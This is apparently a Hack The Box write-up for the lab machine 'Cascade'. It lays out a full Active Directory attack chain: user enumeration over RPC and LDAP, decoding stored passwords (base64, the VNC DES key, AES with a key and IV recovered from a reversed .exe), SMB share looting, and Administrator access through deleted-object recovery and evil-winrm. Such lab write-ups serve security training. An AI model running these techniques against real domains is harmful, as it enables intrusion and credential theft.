---
layout: post
title: HTB Machine - Cascade
subtitle: 
cover-img: /assets/img/Scifi.1920x1080.jpg
thumbnail-img: /assets/img/Scifi.1920x1080.jpg
share-img: /assets/img/Scifi.1920x1080.jpg
tags: [ HTB, Active Directory, Hack the Box]
---

##### Enumerate smb and rpc. We found some users that we place in a file and then check if we can get a TGT. No luck. We check if there is any other info in the info of the users.

```bash
crackmapexec smb 10.10.10.182 -u ''
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)

rpcclient -U '' 10.10.10.182 -N -c 'enumdomusers' |  grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' > users.txt

/home/rickybana/.local/bin/GetNPUsers.py -no-pass -usersfile users.txt cascade.local/
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User arksvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User r.thompson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User util doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.wakefield doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.hickson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.goodhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a.turnbull doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User d.burman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User BackupSvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.allen doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)

rpcclient -U '' 10.10.10.182 -N -c 'querydispinfo'
index: 0xee0 RID: 0x464 acb: 0x00000214 Account: a.turnbull	Name: Adrian Turnbull	Desc: (null)
index: 0xebc RID: 0x452 acb: 0x00000210 Account: arksvc	Name: ArkSvc	Desc: (null)
index: 0xee4 RID: 0x468 acb: 0x00000211 Account: b.hanson	Name: Ben Hanson	Desc: (null)
index: 0xee7 RID: 0x46a acb: 0x00000210 Account: BackupSvc	Name: BackupSvc	Desc: (null)
index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: CascGuest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xee5 RID: 0x469 acb: 0x00000210 Account: d.burman	Name: David Burman	Desc: (null)
index: 0xee3 RID: 0x467 acb: 0x00000211 Account: e.crowe	Name: Edward Crowe	Desc: (null)
index: 0xeec RID: 0x46f acb: 0x00000211 Account: i.croft	Name: Ian Croft	Desc: (null)
index: 0xeeb RID: 0x46e acb: 0x00000210 Account: j.allen	Name: Joseph Allen	Desc: (null)
index: 0xede RID: 0x462 acb: 0x00000210 Account: j.goodhand	Name: John Goodhand	Desc: (null)
index: 0xed7 RID: 0x45c acb: 0x00000210 Account: j.wakefield	Name: James Wakefield	Desc: (null)
index: 0xeca RID: 0x455 acb: 0x00000210 Account: r.thompson	Name: Ryan Thompson	Desc: (null)
index: 0xedd RID: 0x461 acb: 0x00000210 Account: s.hickson	Name: Stephanie Hickson	Desc: (null)
index: 0xebd RID: 0x453 acb: 0x00000210 Account: s.smith	Name: Steve Smith	Desc: (null)
index: 0xed2 RID: 0x457 acb: 0x00000210 Account: util	Name: Util	Desc: (null)
```

##### we can try to bruteforce the pass expecting for a user to use his username as pass but that would not work. Next we can try to enumerate the ldap.
```bash
ldapsearch -x -H ldap://10.10.10.182 -b 'DC=cascade,DC=local' | cat -l ruby
```
##### the colors of the batcat make it easier to read. We are looking for the userPrincipalName to check our users. in the batcat use /userPrincipalName to search for the parameter and press N in your keyboard to jump to the next hit. Underneath the user r.thomson we see an interesting parameter. 
```bash
cascadeLegacyPwd: clk0bjVldmE=
```
##### seems like is base64 so we need to decode: 
```bash
echo 'clk0bjVldmE=' | base64 -d; echo
rY4n5eva
```
##### verify the pass with crackmapexec.
```bash
crackmapexec winrm 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva'
SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [-] cascade.local\r.thompson:rY4n5eva 

crackmapexec smb 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva'
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
```
##### We can try to do a dump of the ldap to check it. So we do the dump on our content folder and from there start a webserver. Then go to the browser and the localhost address, check all the data in the html files. 
```bash
ldapdomaindump 10.10.10.182 -u 'cascade.local\r.thompson' -p 'rY4n5eva'

python3 -m http.server 80
```
##### we are going to enumerate the smb now.
```bash
smbmap -H 10.10.10.182 -u "r.thompson" -p 'rY4n5eva' -r

smbmap -H 10.10.10.182 -u "r.thompson" -p 'rY4n5eva' -A '(xlsx|docx|txt|xml|reg|log|html)' -R
```

##### We found a file .reg if we cat it we could see a password fiel that is coded in hex. When decoding it we se that the password has a weird pattern, but we could try to decode it, if we ask saint google for 'VNC view decrypted password github' a few tools appear. The solution we found uses for tools already in the system. 

```bash
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f

echo "6bcf2a4b6e5aca0f" | xxd -ps -r | xxd
00000000: 6bcf 2a4b 6e5a ca0f                      k.*KnZ..

echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008
```

##### we dont know for which user is the credential valid but we are going to use it against our list of users to find out. After finding it we can winrm to the machine and extract the first flag.  

```bash
crackmapexec winrm 10.10.10.182 -u users.txt -p 'sT333ve2' --continue-on-success
WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)

evil-winrm -i 10.10.10.182 -u 's.smith' -p 'sT333ve2'
```

##### From there we need to enumerate our priv and the user memberships. If we enum the audit share local group we see a comment that seems to mention a share. We will jump and enumerate then smb with the user credentials. The folder Audit$ seems to have interesting stuff, we are going to dl to our attack machine to check it. For that we will connect with smbclient, turn the prompt off so it does not ask for 'are you sure?' all the time, we activate the recurse so it goes inside each folder and then run a mget * to dl it. 

```bash
whoami /all
net user s.smith
net localgroup 'Audit Share'

smbmap -H 10.10.10.182 -u 's.smith' -p 'sT333ve2' -r Audit$

smbclient //10.10.10.182/Audit$ -U "s.smith%sT333ve2"
prompt off
recurse ON
mget *

```
##### we examine the files there is one that contains a database. Mount it to examine it. If we enum all tables we will find something intersting in one of the tables. Seems like a base64 but when decoding it the pattern does not seem correct. 

```bash
cd DB

file Audit.db
Audit.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 60, database pages 6, 1st free page 6, free pages 1, cookie 0x4b, schema 4, UTF-8, version-valid-for 60

.tables

select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

##### go back to the dl files and lets keep examining it. There is an exe file and when displaying the strings we can see some sort of pass. testing it with crackmapexec against our list of users is unfruitful. So we might need to dig deeper into the .exe file.

```bash
strings CascAudit.exe -e l

c4scadek3y654321
```

##### in a windows machine install dotpeek tool and open the .exe file in it, we verify in the code that the key is that one. The code mentions an import module called crypto that is used to decrypt along with the key. The crypto module is a .dll that we have and we can also import in dotPeek. Once we have it there we can examine it and see and IV key. Also the code mentions the encryption type. 

AES mode CBC

##### with that info we can go to cyberchef and feed it with the input and 2 modules: From base 64 and AES decrypt

```
From base 64: standard

AES decrypt
Key: c4scadek3y654321
UTF8
IV: 1tdyjCbY1Ix49842
UTF8
Mode: CBC
Input: Raw
Output: Raw

output: w3lc0meFr31nd
```

##### we can verify the credentials and login as the user. 

```Bash
crackmapexec winrm 10.10.10.182 -u 'ArkSvc' -p 'w3lc0meFr31nd'
SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\ArkSvc:w3lc0meFr31nd (Pwn3d!)

evil-winrm -i 10.10.10.182 -u 'ArkSvc' -p 'w3lc0meFr31nd'
```

##### we know that the user is able to see deleted object from the AD and in one of the files we enumerated earlier it was mentioned that there was a TempAdmin with the same credentials as the Admin. If we google 'powershell get object deleted object filter' we get to a post with a command to show already deleted users. We will add to list all the properties. In on of the properties there is a pass coded in base64, decode it to get the password, validate it and collect the root flag.

```bash
get-adobject -Filter {Deleted -eq $true -and ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *

echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d; echo
baCT3r1aN00dles

evil-winrm -i 10.10.10.182 -u 'Administrator' -p 'baCT3r1aN00dles'
```